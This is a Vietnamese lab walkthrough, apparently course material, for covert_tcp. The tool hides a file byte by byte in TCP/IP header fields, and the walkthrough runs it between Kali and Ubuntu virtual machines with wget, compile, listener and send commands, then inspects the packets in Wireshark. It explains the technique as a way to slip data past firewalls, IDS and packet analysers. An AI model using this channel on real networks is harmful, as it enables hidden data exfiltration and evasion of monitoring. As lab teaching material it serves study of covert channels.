# Kênh Bí mật sử dụng Cover_TCP
Chương trình này thao túng header TCP/IP để truyền file từng byte một đến máy đích.

Mạng sử dụng quyền kiểm soát truy cập mạng để cho phép/từ chối lưu lượng đi qua. Tunneling được sử dụng để bỏ qua các quy tắc kiểm soát truy cập của tường lửa, IDS, IPS, proxy web để cho phép một số loại lưu lượng nhất định. Kênh bí mật có thể được tạo bằng cách chèn dữ liệu vào các trường không sử dụng của header giao thức. Có nhiều trường không sử dụng hoặc sử dụng sai trong TCP hoặc IP qua đó dữ liệu có thể được gửi để bỏ qua tường lửa.

### `Covert_TCP`
Covert_TCP thao túng header TCP/IP của gói dữ liệu để gửi file từng byte một từ bất kỳ máy nào đến đích. Nó có thể hoạt động như cả máy chủ và máy khách và có thể được sử dụng để ẩn dữ liệu được truyền bên trong header IP. Điều này hữu ích khi bỏ qua tường lửa và gửi dữ liệu với các gói trông hợp pháp không chứa dữ liệu cho trình phân tích gói.

### Mục tiêu
* Cách thực hiện lưu lượng bí mật bên trong các trường không sử dụng của header TCP và IP.

### Yêu cầu
* Máy ảo Windows Server 2016/2012.
* Máy ảo Kali Linux.
* máy ảo Ubuntu Linux.

***
### Tạo File Thông điệp Bí mật
Trên Kali Linux, khởi chạy một cửa sổ Terminal mới.

1. Tạo một thư mục tên **send** trên **Desktop**, và điều hướng vào nó:
`cd Desktop`
`mkdir send`
`cd send`

2. Tạo file text tên **message.txt** bên trong thư mục **send** chứa chuỗi: **Secret Message!**
`echo "Secret Message!" > message.txt`

### Biên dịch **convert_tcp**
3. Tải file **covert_tcp.c** vào **thư mục send:**
`wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c`

4. Biên dịch file convert_tcp.c:
`cc -o covert_tcp covert_tcp.c`
![covert-compile-1](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/d1ba707cb8661a70e9081b65d5aec738b1a31d8e/covert-1.png)

### Tạo Đích Nhận
5. Chuyển sang Ubuntu và mở một cửa sổ Terminal mới.

6. Chuyển sang quyền super-user:
`sudo su`

7. Khởi động **[tcpdump](https://www.lifewire.com/tcpdump-linux-command-unix-command-4097081)** như hình dưới đây:
`tcpdump -nvvX port 8888 -i lo`
![tcp-dump-ubuntu-2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/3667d22752bffd47fb4bdc59cd292264d2678674/covert-2.png)

8. Để **tcpdump listener** chạy và mở một cửa sổ hoặc tab Terminal khác.

9. Truy cập Desktop và tạo một thư mục tên **receive** và điều hướng vào nó:
`cd Desktop`
`mkdir receive`
`cd receive`

10. Tải file **covert_tcp.c** vào **thư mục receive:**
`wget https://raw.githubusercontent.com/cudeso/security-tools/master/networktools/covert/covert_tcp.c`

11. Biên dịch file convert_tcp.c:
`cc -o covert_tcp covert_tcp.c`
Lưu ý: Trong trường hợp bạn gặp lỗi về lệnh `cc`, cài đặt trình biên dịch:
`sudo apt install gcc`

### Thiết lập Listener
12. Khởi động Listener [Dest=Ubuntu, Source=Kali]:
`./covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 9999 -dest_port 8888 -server -file /home/s4msepi0l/Desktop/receive/receive.txt`
![Ubuntu-tcplistener](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Listener-ubuntu-covert-4.png)

### Khởi chạy Wireshark trên Kali
13. Quay lại Kali và khởi chạy Wireshark.
![wireshark-kali-1](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-5.png)

14. Bắt đầu bắt gói Wireshark, nhấp đúp vào mục giao diện mạng chính:
![wirehsark-capturing-kali-2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/6394f2daeb23be93a5f775358d395c1862da8791/Wireshark-Covert-6.png)

### Bắt đầu Gửi **Thông điệp Bí mật**
15. Thu nhỏ Wireshark và mở một cửa sổ Terminal mới trên Kali, điều hướng đến thư mục **send**.
16. Bắt đầu gửi nội dung của file message.txt qua TCP.
`/covert_tcp -dest 10.0.2.46 -source 10.0.2.42 -source_port 8888 -dest_port 9999 -file /root/Desktop/send/message.txt`
![sendsecretmessage](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-7.png)
Covert_tcp bắt đầu gửi chuỗi từng ký tự một như hình trên.
Nếu bạn chuyển sang cửa sổ terminal trên Ubuntu, bạn sẽ thấy thông điệp đang được nhận:
![receivingsecretmessage](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/ec17197736d6b7a86925a36016d64c4ef5e25444/message-covert-8.png)

### Phân tích Kết quả
17. Trên máy Ubuntu, dừng tcpdump bằng cách nhấn **Ctrl+C** như hình dưới đây:
![tcpdump-stop](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/cover-9.png)
Tcpdump cho thấy không có gói nào được bắt trong mạng.

18. Điều hướng đến **/Desktop/receive/** và nhấp đúp vào file **receive.txt** để xem nội dung. Bạn sẽ thấy toàn bộ thông điệp được lưu trong file như hình dưới đây:
![secretmessage-kali](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/0dc76e10644c655c0871c8910233c7869a725593/covert-10.png)

19. Chuyển lại **Kali và Dừng bắt gói trên Wireshark** bằng cách nhấp vào nút đỏ ở góc trên bên trái.

20. Nhấp vào ô **Apply a display filter** và nhập **tcp** để chỉ xem các gói TCP như hình dưới đây:
![apply-display-filter=tcp](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/wireshark-covert-11.png)


Nếu bạn kiểm tra giao tiếp giữa Ubuntu và Kali (10.0.2.46 - 10.0.2.42) bạn sẽ thấy mỗi ký tự của chuỗi thông điệp được **gửi dưới dạng gói riêng lẻ qua mạng** hiển thị trong ảnh chụp màn hình tiếp theo:

Covert_tcp thay đổi header của gói TCP và thay thế nó bằng các ký tự của chuỗi từng ký tự một để gửi thông điệp mà không bị phát hiện.

Gói 1, chuỗi: **S**
![tcp-1](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/s-tcp-12.png)

Gói 2, chuỗi: **e**
![tcp-2](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/e-tcp-13.png)

Gói 3, chuỗi: **c**
![tcp-3](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/c-tcp-14.png)

Gói 4, chuỗi: **r**
![tcp-4](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/327d05e1f91358627301eb39de6dfb12f74d88ae/r-tcp-15.png)

(...) Và tiếp tục cho đến khi toàn bộ thông điệp hoàn thành.
